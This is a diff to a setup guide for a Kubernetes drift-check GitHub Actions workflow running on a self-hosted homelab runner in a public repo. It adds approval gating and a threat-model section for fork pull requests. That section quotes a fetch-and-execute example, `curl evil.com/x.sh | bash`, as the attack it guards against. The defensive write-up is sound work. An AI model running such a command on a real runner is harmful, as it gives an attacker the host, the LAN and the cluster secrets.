@@ -2,8 +2,8 @@
 
 One-time setup the operator must complete on the homelab before the
 `.github/workflows/k8s-drift.yml` workflow produces a visible signal on
-PRs. Until step 4 is done, the workflow exits early with a "skipped"
-notice — it does not fail.
+PRs. Until step 6 (`K8S_DRIFT_CHECK_ENABLED=true`) is done, the workflow
+exits early with a "skipped" notice — it does not fail.
 
 Scope: implements **Option 1 (advisory PR comment)** from issue #133.
 The workflow runs `kubectl diff -f infra/k8s/` against the live homelab
@@ -91,7 +91,38 @@ KUBECONFIG=/tmp/kubeconfig-ci-drift-checker.yaml kubectl auth can-i delete confi
 # Expected: no
 ```
 
-### 3. Register a self-hosted runner labeled `homelab`
+### 3. Configure the `production-drift-check` deployment environment
+
+The workflow's `drift:` job declares `environment: production-drift-check`.
+On a public repo with a self-hosted runner, this environment's
+required-reviewer rule is the human gate that prevents fork PRs from
+executing the diff job without operator approval. Set it up before
+the runner registers in step 4 so the first run has somewhere to
+pause.
+
+1. In GitHub: **Settings → Environments → New environment**.
+2. Name it exactly `production-drift-check` (must match the workflow).
+3. Under **Deployment protection rules**, check **Required reviewers**
+   and add yourself (the operator). Leave the wait timer at 0.
+4. **Leave "Prevent self-review" UNCHECKED.** You author most PRs in this
+   repo; if self-review is prevented, every one of your own PRs that
+   touches `infra/k8s/**` will pause forever waiting for a different
+   reviewer. With self-review allowed, you click "Approve and deploy"
+   on your own PR (one-click), and fork PRs still require your explicit
+   approval before the diff job runs.
+5. Leave **Deployment branches** unrestricted — `pull_request_target`
+   workflows always run from `main`, so branch restrictions add nothing.
+6. Save.
+
+Verify:
+
+```sh
+gh api repos/ridopark/oh-my-tradeagent/environments \
+  --jq '.environments[] | select(.name == "production-drift-check") | {name, protection_rules: [.protection_rules[] | .type]}'
+# Expected: { "name": "production-drift-check", "protection_rules": ["required_reviewers"] }
+```
+
+### 4. Register a self-hosted runner labeled `homelab`
 
 GitHub Actions cannot reach the homelab from a hosted runner — the
 homelab k3s API is LAN-only. Register a self-hosted runner on a LAN
@@ -109,30 +140,36 @@ host so the workflow can run `kubectl diff` against the live cluster.
 
 Verify the runner appears as **Idle** under Settings → Actions → Runners.
 
-### 4. Add the kubeconfig as a repo secret
+### 5. Add the kubeconfig as a repo secret
 
 ```sh
 gh secret set KUBECONFIG_READONLY < /tmp/kubeconfig-ci-drift-checker.yaml
 rm /tmp/kubeconfig-ci-drift-checker.yaml
 ```
 
-### 5. Flip the enablement variable
+### 6. Flip the enablement variable
 
 The workflow's preflight job gates on `vars.K8S_DRIFT_CHECK_ENABLED ==
 'true'`. Until this var is `true`, every run skips early with a friendly
-notice. Flip it only after steps 1-4 are confirmed.
+notice. Flip it only after steps 1-5 are confirmed.
 
 ```sh
 gh variable set K8S_DRIFT_CHECK_ENABLED --body "true"
 ```
 
-### 6. Confirm on the next `infra/k8s/**` PR
+### 7. Confirm on the next `infra/k8s/**` PR
 
 The next PR that touches `infra/k8s/**` should:
 
 - Trigger the **k8s drift check (advisory)** workflow.
-- Run the preflight on GitHub-hosted infra, then dispatch the diff job
-  to the self-hosted runner.
+- Run the preflight on GitHub-hosted infra.
+- Pause the `kubectl diff` job with a yellow **"Review pending
+  deployments"** banner on the PR (this is the `production-drift-check`
+  environment's required-reviewer gate). Click **Approve and deploy**
+  to release it to the self-hosted runner. For your own PRs this is
+  a one-click confirmation; for any fork PR you should review the
+  diff first.
+- After approval: dispatch the diff job to the self-hosted runner.
 - Post a comment starting with `### k8s drift check (advisory)` (or
   update it if the PR is pushed again).
 
@@ -153,6 +190,7 @@ To fully remove:
 ```sh
 gh secret delete KUBECONFIG_READONLY
 gh variable delete K8S_DRIFT_CHECK_ENABLED
+gh api -X DELETE repos/ridopark/oh-my-tradeagent/environments/production-drift-check
 kubectl delete -f infra/k8s/56-ci-readonly-sa.yaml
 kubectl -n copytrade delete secret ci-drift-checker-token
 # Deregister the self-hosted runner from Settings → Actions → Runners.
@@ -174,6 +212,48 @@ Short-lived tokens via `kubectl create token ci-drift-checker --duration=1h`
 are a future hardening option. They were deferred to keep CI kubeconfig
 plumbing simple — a long-lived token Secret avoids the need for a runner-side
 token-refresh mechanism.
+
+### Public-repo workflow safety
+
+This repo is public. A self-hosted runner on a public repo is a classic
+foot-gun: anyone can fork the repo, open a PR that edits the workflow
+file (e.g. removes the preflight gate, adds `curl evil.com/x.sh | bash`),
+and trigger arbitrary code execution on the runner as the `ridopark`
+user — full LAN access, every Secret in the k3s cluster, the host
+filesystem. To make a self-hosted runner safe here, the workflow has
+three layered defenses:
+
+1. **Trigger is `pull_request_target`, not `pull_request`.** Workflows
+   triggered by `pull_request_target` always execute the workflow file
+   as it exists on `main`, never the PR head's version. A fork PR
+   cannot modify what the workflow does — they can only contribute
+   manifest content under `infra/k8s/`. So the preflight gate, the
+   environment requirement, the secret-handling — all stay enforceable
+   regardless of what the PR diff looks like. (Workflow-file changes
+   themselves are caught by normal PR review of `.github/workflows/**`
+   before merge.)
+
+2. **`drift:` job is bound to a required-reviewer environment.** The
+   `environment: production-drift-check` declaration ties the job's
+   execution to the environment configured in step 3, which requires
+   the operator to click an "Approve and deploy" button before the
+   runner picks the job up. Every fork-PR diff job pauses there until
+   the operator inspects the PR diff.
+
+3. **No PR-supplied script ever executes.** The only step that touches
+   PR content is `kubectl diff -f infra/k8s/`, which parses the PR's
+   YAML manifests as data and compares them to the cluster's live
+   state. kubectl does not run anything from the manifests. The
+   workflow never invokes `bash`, `make`, `npm install`, `pip install`,
+   or any other command that would interpret PR-supplied scripts. If a
+   future change adds such a command, the safety guarantee breaks —
+   review `pull_request_target` workflow edits with that in mind.
+
+The combination is genuinely safe for read-only manifest validation.
+If the workflow ever needs to execute PR-supplied code (run a test
+suite, build an image), this design must be revisited — at that point
+the right answer is probably a Tailscale tunnel from a GitHub-hosted
+runner rather than a self-hosted runner on the LAN.
 
 ## Why advisory-only
 
